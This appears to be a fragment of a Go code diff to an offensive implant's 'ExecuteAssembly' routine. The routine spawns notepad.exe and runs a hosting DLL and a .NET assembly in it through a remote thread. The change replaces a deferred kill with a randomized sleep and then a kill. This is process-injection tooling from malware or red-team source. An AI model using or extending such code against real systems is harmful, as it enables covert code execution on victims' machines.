@@ -6,10 +6,12 @@ import (
 	"fmt"
 	"io"
 	"io/ioutil"
+	"math/rand"
 	"os"
 	"os/exec"
 	"runtime"
 	"syscall"
+	"time"
 	"unsafe"
 
 	// {{if .Debug}}
@@ -245,7 +247,6 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string, timeout int32) 
 
 	var errStdout, errStderr error
 	cmd.Start()
-	defer cmd.Process.Kill()
 	pid := cmd.Process.Pid
 	// {{if .Debug}}
 	log.Println("[*] notepad.exe started, pid =", pid)
@@ -295,7 +296,11 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string, timeout int32) 
 	if err != nil {
 		return "", err
 	}
-
+	// {{if .Debug}}
+	log.Printf("[*] RemoteThread started, now sleeping %d seconds...\n", timeout)
+	// {{end}}
+	time.Sleep(time.Duration(rand.Int31n(timeout)) * time.Second)
+	cmd.Process.Kill()
 	go func() {
 		_, errStdout = io.Copy(&stdoutBuf, stdoutIn)
 	}()
